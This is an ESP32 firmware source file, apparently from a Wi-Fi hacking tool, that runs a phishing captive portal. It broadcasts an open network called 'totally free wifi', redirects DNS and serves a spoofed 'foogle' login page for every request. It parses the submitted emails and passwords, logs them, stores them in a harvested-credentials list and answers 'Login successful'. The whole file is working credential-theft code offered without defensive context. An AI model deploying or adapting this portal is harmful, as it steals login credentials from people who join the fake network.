#include "captive_portal.h"
#include "esp_log.h"

static const char *TAG = "CAPTIVE_PORTAL";

#define CAPTIVE_SSID "totally free wifi"
extern const uint8_t foogle_html_start[] asm("_binary_foogle_html_start");
extern const uint8_t foogle_html_end[] asm("_binary_foogle_html_end");

static void wifi_init_softap(void);
static esp_err_t http_get_handler(httpd_req_t *req);
static httpd_handle_t start_webserver(void);

static httpd_handle_t server = NULL;
static esp_netif_t *wifi_ap_netif = NULL;


static void dns_task(void *pvParamter) {
    start_dns_server();
    vTaskDelete(NULL);
}


// Main function to initilize and start captive portal
void captive_portal_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    wifi_init_softap();
    start_webserver();

    // create separate task for DNS server
    xTaskCreate(dns_task, "dns_task", 4096, NULL, 5, NULL);
}

static void wifi_init_softap(void) {
    wifi_ap_netif = esp_netif_create_default_wifi_ap();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    wifi_config_t wifi_config = {
        .ap = {
            .ssid = CAPTIVE_SSID,
            .ssid_len = strlen(CAPTIVE_SSID),
            .channel = 1,
            .password = "", // open network
            .max_connection = 4,
            .authmode = WIFI_AUTH_OPEN,
        },
    };

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "Wi-Fi AP started. SSID: %s", CAPTIVE_SSID);

}

// HTTP get request handler
static esp_err_t http_get_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, (const char *)foogle_html_start, foogle_html_end - foogle_html_start);
    return ESP_OK;
}

// handle post request data from form
static login_data_t login_data = { .valid = false};

static esp_err_t http_post_handler(httpd_req_t *req) {
    int total_len = req->content_len;
    int received = 0;
    char *buf = malloc(total_len + 1);
    if (!buf) return ESP_ERR_NO_MEM; // avoid seg faults

    while (received < total_len) {
        int ret = httpd_req_recv(req, buf + received, total_len - received);
        if (ret <= 0) {
            free(buf);
            return ESP_FAIL;
        }
        received += ret;
    }
    buf[total_len] = '\0'; // null termination

    ESP_LOGI(TAG, "Received POST data: %s", buf);

    //parse req body
    char *email = strtok(buf, "=");
    char *email_val = strtok(NULL, "&");
    char *password = strtok(NULL, "=");
    char *password_val = strtok(NULL, "");

    ESP_LOGI(TAG, "Email: %s, Pasword: %s", email_val, password_val);

    strncpy(login_data.email, email_val, sizeof(login_data.email) - 1);
    strncpy(login_data.password, password_val, sizeof(login_data.password) - 1);
    login_data.valid = true;
    add_login_to_list(login_data);

    httpd_resp_sendstr(req, "Login successful");
    free(buf);
    return ESP_OK;
}

// start http server
static httpd_handle_t start_webserver(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();

    // wildcard matching for URIs
    config.uri_match_fn = httpd_uri_match_wildcard;

    httpd_handle_t server = NULL;
    if (httpd_start(&server, &config) == ESP_OK) {
        httpd_uri_t uri_handler = {
            .uri = "/*",
            .method = HTTP_GET,
            .handler = http_get_handler,
            .user_ctx = NULL
        };

        httpd_register_uri_handler(server, &uri_handler);
    }

    httpd_uri_t post_handler = {
        .uri = "/login",
        .method = HTTP_POST,
        .handler = http_post_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(server, &post_handler);

    return server;
}

login_data_t get_captured_login(void) {
    return login_data;
}

void add_login_to_list(login_data_t new_data) {
    ListNode* new_node = malloc(sizeof(ListNode));
    if (!new_node) return;

    new_node->data = new_data;
    new_node->next = harvested_data_head;
    harvested_data_head = new_node;
}

void stop_captive_portal(void) {
    ESP_LOGI(TAG, "Stopping Captive Portal...");

    // stop http server
    if (server) {
        httpd_stop(server);
        server = NULL;
        ESP_LOGI(TAG, "HTTP server stopped");
    }

    // stop dns server and close port
    stop_dns_server();

    // stop esp wifi mode
    esp_err_t err = esp_wifi_stop();
    if (err == ESP_ERR_WIFI_NOT_INIT) {
        ESP_LOGW(TAG, "Wi-Fi is not initialized, skipping esp_wifi_stop()");
    } else {
        ESP_ERROR_CHECK(err);
    }

    // de-initialize wifi
    err = esp_wifi_deinit();
    if (err == ESP_ERR_WIFI_NOT_INIT) {
        ESP_LOGW(TAG, "Wi-Fi not initialized, skipping esp_wifi_deinit()");
    } else {
        ESP_ERROR_CHECK(err);
    }

    // destroy default AP interface 
    if (wifi_ap_netif) {
        esp_netif_destroy_default_wifi(wifi_ap_netif);
        wifi_ap_netif = NULL;
    }

    // // deinit netif NOT SUPPORTED BY ESP IDF
    // err = esp_netif_deinit();
    // if (err != ESP_OK) {
    //     ESP_LOGW(TAG, "esp_netif_deinit failed: %s", esp_err_to_name(err));
    // } else {
    //     ESP_LOGI(TAG, "esp_netif deinitialized");
    // }

    // delete default loop on stop
    err = esp_event_loop_delete_default();
    if (err == ESP_ERR_INVALID_STATE) {
        ESP_LOGW(TAG, "Event loop not created or already deleted");
    } else {
        ESP_ERROR_CHECK(err);
        ESP_LOGI(TAG, "Default event loop deleted");
    }

    ESP_LOGI(TAG, "Wi-Fi AP stopped");
}
